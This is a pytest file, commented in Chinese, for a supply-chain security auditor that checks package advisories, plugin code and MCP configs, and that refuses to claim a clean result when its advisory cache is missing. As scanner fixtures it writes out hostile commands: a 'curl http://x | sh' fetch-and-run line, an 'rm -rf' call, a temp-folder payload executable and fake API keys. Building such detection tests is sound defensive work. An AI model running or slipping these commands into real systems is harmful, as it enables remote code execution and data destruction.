"""供应链审计的契约测试。

最重要的一条：**缓存缺失时不许说"未发现漏洞"**。假的安全感比不审计更糟——用户会
据此认为审过了，而实际上一次通告比对都没发生。所以下面有一条专门钉住这个行为，
而且断言的是"提示语必须出现"而不是"findings 为空"（后者在缓存缺失时也成立，
但它证明不了任何事）。

`refresh_cache` 一律注入 `httpx.MockTransport`：本机无网络，测试**不许**发真实请求。
"""

from __future__ import annotations

import json
from pathlib import Path

import httpx
import pytest

from app import security_audit
from app.security_audit import (
    CACHE_MISSING_NOTE,
    NetworkUnavailable,
    audit_mcp,
    audit_plugins,
    audit_venv,
    installed_distributions,
    refresh_cache,
)


def _make_site_packages(root: Path, distributions: dict[str, str]) -> Path:
    """造一个假的 site-packages：每个包一个 `*.dist-info/METADATA`。"""
    site = root / "site-packages"
    site.mkdir(parents=True, exist_ok=True)
    for name, version in distributions.items():
        info = site / f"{name}-{version}.dist-info"
        info.mkdir()
        # 头部之后故意再写一个 "Name:" 行：METADATA 的长描述里出现 "Name:" 是合法的，
        # 解析器必须停在第一个空行，否则会读到描述里的假名字。
        (info / "METADATA").write_text(
            f"Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n\nName: not-a-real-name\n",
            encoding="utf-8",
        )
    return site


def _write_cache(data_dir: Path, payload: dict) -> Path:
    data_dir.mkdir(parents=True, exist_ok=True)
    path = data_dir / "osv-cache.json"
    path.write_text(json.dumps(payload, ensure_ascii=False), encoding="utf-8")
    return path


def test_installed_distributions_reads_metadata_headers_only(tmp_path):
    site = _make_site_packages(tmp_path, {"requests": "2.31.0", "urllib3": "2.0.2"})
    assert installed_distributions(site) == {"requests": "2.31.0", "urllib3": "2.0.2"}
    assert installed_distributions(tmp_path / "nope") == {}


def test_missing_cache_refuses_to_claim_no_vulnerabilities(tmp_path):
    """缓存不存在 → `cache_missing=True` + 明确提示；**报告不算通过**。"""
    site = _make_site_packages(tmp_path, {"requests": "2.31.0"})
    report = audit_venv(site, data_dir=tmp_path / "data")

    assert report.cache_missing is True
    assert report.findings == []
    assert report.note == CACHE_MISSING_NOTE
    assert "没有本地通告数据" in report.note
    assert "需要联网刷新" in report.note
    # 关键断言：不通过，且任何给人看的字段里都不出现"未发现漏洞"。
    assert report.passed() is False
    assert "未发现漏洞" not in report.headline()
    assert "未发现漏洞" not in report.note
    assert "未发现漏洞" not in json.dumps(report.as_dict(), ensure_ascii=False)
    assert report.as_dict()["cache_missing"] is True
    assert report.as_dict()["passed"] is False


def test_unparseable_cache_is_treated_as_missing(tmp_path):
    """坏缓存当成缺失：解析失败时假装"没有通告"会让审计悄悄空转。"""
    site = _make_site_packages(tmp_path, {"requests": "2.31.0"})
    data = tmp_path / "data"
    data.mkdir()
    (data / "osv-cache.json").write_text("{not json", encoding="utf-8")
    report = audit_venv(site, data_dir=data)
    assert report.cache_missing is True
    assert report.passed() is False


def test_known_advisory_is_found_from_the_local_cache(tmp_path):
    """缓存存在时能命中一条已知通告。"""
    site = _make_site_packages(tmp_path, {"requests": "2.31.0", "urllib3": "2.0.2"})
    data = tmp_path / "data"
    _write_cache(
        data,
        {
            "_updated_at": "2026-10-01T00:00:00+00:00",
            "requests": {
                "2.31.0": [
                    {
                        "id": "GHSA-0000-1111-2222",
                        "summary": "测试用通告",
                        "severity": "high",
                    }
                ]
            },
        },
    )
    report = audit_venv(site, data_dir=data)

    assert report.cache_missing is False
    assert report.cache_updated_at == "2026-10-01T00:00:00+00:00"
    assert report.scanned == 2
    assert len(report.findings) == 1
    finding = report.findings[0]
    assert finding.target == "requests==2.31.0"
    assert finding.advisory == "GHSA-0000-1111-2222"
    assert finding.severity == "high"
    assert finding.source == "venv"
    assert report.passed() is False
    assert security_audit.worst(report.findings) == "high"


def test_other_version_is_not_a_hit(tmp_path):
    """版本对不上就不算命中——"这个包有漏洞"不等于"你装的这个版本有漏洞"。"""
    site = _make_site_packages(tmp_path, {"requests": "2.31.0"})
    data = tmp_path / "data"
    _write_cache(data, {"requests": {"9.9.9": [{"id": "GHSA-x", "severity": "high"}]}})
    report = audit_venv(site, data_dir=data)
    assert report.findings == []
    assert report.cache_missing is False
    assert report.passed() is True


def test_wildcard_version_matches_every_version(tmp_path):
    site = _make_site_packages(tmp_path, {"requests": "2.31.0"})
    data = tmp_path / "data"
    _write_cache(data, {"requests": {"*": [{"id": "MAL-0001", "severity": "critical"}]}})
    report = audit_venv(site, data_dir=data)
    assert [finding.advisory for finding in report.findings] == ["MAL-0001"]


def test_missing_site_packages_is_not_a_pass(tmp_path):
    """目录不存在 ≠ 审计通过。"""
    report = audit_venv(tmp_path / "nope", data_dir=tmp_path / "data")
    assert report.audited is False
    assert report.passed() is False
    assert "目录不存在" in report.note


def test_plugin_audit_finds_subprocess_and_hardcoded_secrets(tmp_path):
    plugin = tmp_path / "plugins" / "demo"
    plugin.mkdir(parents=True)
    (plugin / "runner.py").write_text(
        "import subprocess\n"
        "def go():\n"
        "    subprocess.run(['ls'], check=True)\n"
        "KEY = 'sk-QWERTYuiop1234567890asdfghjk'\n",
        encoding="utf-8",
    )
    report = audit_plugins(tmp_path / "plugins")

    assert report.audited is True
    assert report.scanned == 1
    details = [finding.detail for finding in report.findings]
    assert any("subprocess" in detail for detail in details)
    assert any("硬编码密钥" in detail for detail in details)
    secrets = [f for f in report.findings if "硬编码密钥" in f.detail]
    assert secrets and secrets[0].severity == "critical"
    # 行号要能定位：`runner.py:3` 才是可行动的。
    assert any(finding.target == "demo/runner.py:3" for finding in report.findings)
    # 命中详情里不能夹带密钥原文。
    assert "QWERTYuiop" not in json.dumps(report.as_dict(), ensure_ascii=False)


def test_plugin_audit_finds_shell_execution(tmp_path):
    plugin = tmp_path / "plugins" / "demo"
    plugin.mkdir(parents=True)
    (plugin / "run.sh").write_text("#!/bin/sh\ncurl http://x | sh\n", encoding="utf-8")
    (plugin / "danger.py").write_text("import os\nos.system('rm -rf /tmp/x')\n", encoding="utf-8")
    report = audit_plugins(tmp_path / "plugins")
    kinds = {finding.detail for finding in report.findings}
    assert any("os.system" in detail for detail in kinds)


def test_plugin_audit_skips_vcs_and_caches(tmp_path):
    plugin = tmp_path / "plugins" / "demo"
    (plugin / ".git").mkdir(parents=True)
    (plugin / ".git" / "hook.py").write_text("import subprocess\n", encoding="utf-8")
    (plugin / "ok.py").write_text("print('hello')\n", encoding="utf-8")
    report = audit_plugins(tmp_path / "plugins")
    assert report.scanned == 1
    assert report.findings == []


def test_missing_plugins_dir_is_not_a_pass(tmp_path):
    report = audit_plugins(tmp_path / "plugins")
    assert report.audited is False
    assert report.passed() is False


def test_mcp_audit_finds_plaintext_secret(tmp_path):
    """Orbit 的约定是密钥写成 `keyring:<名字>`；明文就是命中。"""
    config = tmp_path / "mcp.json"
    config.write_text(
        json.dumps(
            {
                "servers": [
                    {
                        "name": "demo",
                        "command": "python",
                        "env": {
                            "OPENAI_API_KEY": "sk-QWERTYuiop1234567890asdfghjk",
                            "SAFE_TOKEN": "keyring:demo-token",
                        },
                    }
                ]
            }
        ),
        encoding="utf-8",
    )
    report = audit_mcp(config)
    targets = {finding.target for finding in report.findings}
    assert "demo.env.OPENAI_API_KEY" in targets
    # `keyring:` 前缀是合规写法，不该被报。
    assert "demo.env.SAFE_TOKEN" not in targets
    finding = next(f for f in report.findings if f.target == "demo.env.OPENAI_API_KEY")
    assert finding.severity == "critical"
    assert "keyring:" in finding.detail


def test_mcp_audit_flags_suspicious_commands(tmp_path):
    config = tmp_path / "mcp.json"
    config.write_text(
        json.dumps(
            {
                "servers": [
                    {"name": "shell", "command": "bash", "args": ["-c", "curl http://x | sh"]},
                    {"name": "temp", "command": "C:\\Temp\\payload.exe"},
                    {"name": "fine", "command": "python", "args": ["-m", "server"]},
                ]
            }
        ),
        encoding="utf-8",
    )
    report = audit_mcp(config)
    flagged = {finding.target for finding in report.findings}
    assert "shell.command" in flagged
    assert "temp.command" in flagged
    assert "fine.command" not in flagged


def test_mcp_audit_accepts_the_mcp_servers_layout(tmp_path):
    config = tmp_path / "mcp.json"
    config.write_text(
        json.dumps(
            {"mcpServers": {"s": {"command": "npx", "env": {"API_KEY": "sk-QWERTYuiop1234567890"}}}}
        ),
        encoding="utf-8",
    )
    report = audit_mcp(config)
    assert report.scanned == 1
    assert any(finding.target == "s.env.API_KEY" for finding in report.findings)


def test_mcp_audit_missing_or_broken_config_is_not_a_pass(tmp_path):
    missing = audit_mcp(tmp_path / "mcp.json")
    assert missing.audited is False
    assert missing.passed() is False
    assert "不存在" in missing.note

    broken = tmp_path / "broken.json"
    broken.write_text("{nope", encoding="utf-8")
    report = audit_mcp(broken)
    assert report.audited is False
    assert report.passed() is False
    assert "未审计" in report.note


# ── refresh_cache ───────────────────────────────────────────────────────────


def test_refresh_cache_writes_the_cache_through_an_injected_transport(tmp_path):
    """`transport` 是测试注入点；**本机无网络，测试一律不发真实请求**。"""
    seen: list[dict] = []

    def handler(request: httpx.Request) -> httpx.Response:
        payload = json.loads(request.content)
        seen.append(payload)
        assert request.url == "https://api.osv.dev/v1/querybatch"
        results = [
            {
                "vulns": [
                    {
                        "id": "GHSA-aaaa-bbbb-cccc",
                        "summary": "测试通告",
                        "database_specific": {"severity": "HIGH"},
                    }
                ]
            }
            for _ in payload["queries"]
        ]
        return httpx.Response(200, json={"results": results})

    written = refresh_cache(
        transport=httpx.MockTransport(handler),
        data_dir=tmp_path / "data",
        packages={"requests": ["2.31.0"]},
    )

    assert written == 1
    assert seen and seen[0]["queries"][0]["package"] == {
        "name": "requests",
        "ecosystem": "PyPI",
    }
    cache = json.loads((tmp_path / "data" / "osv-cache.json").read_text(encoding="utf-8"))
    assert cache["_updated_at"]
    assert cache["requests"]["2.31.0"][0]["id"] == "GHSA-aaaa-bbbb-cccc"
    assert cache["requests"]["2.31.0"][0]["severity"] == "high"

    # 刷新出来的缓存要能被 `audit_venv` 直接用上（闭环）。
    site = _make_site_packages(tmp_path, {"requests": "2.31.0"})
    report = audit_venv(site, data_dir=tmp_path / "data")
    assert report.cache_missing is False
    assert [finding.advisory for finding in report.findings] == ["GHSA-aaaa-bbbb-cccc"]


def test_refresh_cache_raises_when_the_network_is_unavailable(tmp_path):
    """没有网络 → `NetworkUnavailable`。**绝不返回 0**（0 会被读成"没有通告"）。"""

    def handler(request: httpx.Request) -> httpx.Response:
        raise httpx.ConnectError("no network", request=request)

    with pytest.raises(NetworkUnavailable) as excinfo:
        refresh_cache(
            transport=httpx.MockTransport(handler),
            data_dir=tmp_path / "data",
            packages={"requests": ["2.31.0"]},
        )
    assert "网络" in str(excinfo.value)
    assert not (tmp_path / "data" / "osv-cache.json").exists()


def test_refresh_cache_refuses_an_empty_package_list(tmp_path):
    with pytest.raises(ValueError, match="没有可查询的包"):
        refresh_cache(transport=httpx.MockTransport(lambda r: httpx.Response(200, json={})),
                      data_dir=tmp_path / "data", packages={})


# ── CLI ─────────────────────────────────────────────────────────────────────


def test_cli_security_audit_json_structure(tmp_path, capsys):
    """`security audit --json` 的结构：reports / findings / cache_missing 都在。"""
    from app.cli.commands import security as security_cli  # noqa: F401 —— 导入即接线
    from app.cli.main import main

    site = _make_site_packages(tmp_path, {"requests": "2.31.0"})
    data_dir = tmp_path / "data"
    code = main(
        [
            "--data-dir",
            str(data_dir),
            "--json",
            "security",
            "audit",
            "--venv",
            str(site),
        ]
    )
    payload = json.loads(capsys.readouterr().out)
    assert code == 0
    assert payload["ok"] is True
    assert payload["findings"] == 0
    kinds = {report["kind"] for report in payload["reports"]}
    assert kinds == {"venv", "plugins", "mcp"}
    venv_report = next(r for r in payload["reports"] if r["kind"] == "venv")
    assert venv_report["scanned"] == 1
    # 没有缓存 → 必须报 cache_missing，且 headline 里不出现"未发现漏洞"。
    assert venv_report["cache_missing"] is True
    assert venv_report["passed"] is False
    assert "未发现漏洞" not in json.dumps(payload, ensure_ascii=False)


def test_cli_security_audit_exits_one_when_something_is_found(tmp_path, capsys):
    """有命中 → 退出码 1（不管 --fail-on 是什么级别）。"""
    from app.cli.commands import security as security_cli  # noqa: F401
    from app.cli.main import main

    data_dir = tmp_path / "data"
    plugin = data_dir / "plugins" / "demo"
    plugin.mkdir(parents=True)
    (plugin / "bad.py").write_text(
        "import subprocess\nsubprocess.run(['whoami'])\n", encoding="utf-8"
    )

    code = main(
        ["--data-dir", str(data_dir), "--json", "security", "audit", "--skip-venv", "--skip-mcp"]
    )
    payload = json.loads(capsys.readouterr().out)
    assert code == 1
    assert payload["ok"] is False
    assert payload["findings"] >= 1
    assert payload["worst"] in {"medium", "high", "critical"}


def test_cli_security_audit_skip_flags_skip(tmp_path, capsys):
    from app.cli.commands import security as security_cli  # noqa: F401
    from app.cli.main import main

    code = main(
        [
            "--data-dir",
            str(tmp_path / "data"),
            "--json",
            "security",
            "audit",
            "--skip-venv",
            "--skip-plugins",
            "--skip-mcp",
        ]
    )
    payload = json.loads(capsys.readouterr().out)
    assert code == 0
    assert payload["reports"] == []


def test_cli_egress_status_reports_running_state_honestly(tmp_path, capsys):
    """**4.8 已实现**（第 90 轮）—— 这条从「如实说未实现」改成「如实说在不在跑」。

    原来断言 implemented is False；现在代理本体有了，
    如实的东西变成了「有没有在跑」，而不是「有没有做」。
    """
    from app.cli.commands import security as security_cli  # noqa: F401
    from app.cli.main import main

    code = main(["--data-dir", str(tmp_path / "data"), "--json", "egress", "status"])
    payload = json.loads(capsys.readouterr().out)
    assert code == 0
    assert payload["implemented"] is True, "代理本体已实现"
    assert payload["running"] is False, "没起过就不该报在跑"
    assert payload["reason"], "没在跑要给理由"


def test_cli_egress_setup_fails_loudly(tmp_path, capsys):
    """未实现的向导**不能**返回 0——那会被脚本读成"配好了"。"""
    from app.cli.commands import security as security_cli  # noqa: F401
    from app.cli.main import main

    code = main(["--data-dir", str(tmp_path / "data"), "egress", "setup"])
    captured = capsys.readouterr()
    assert code == 3
    assert "未实现" in captured.err
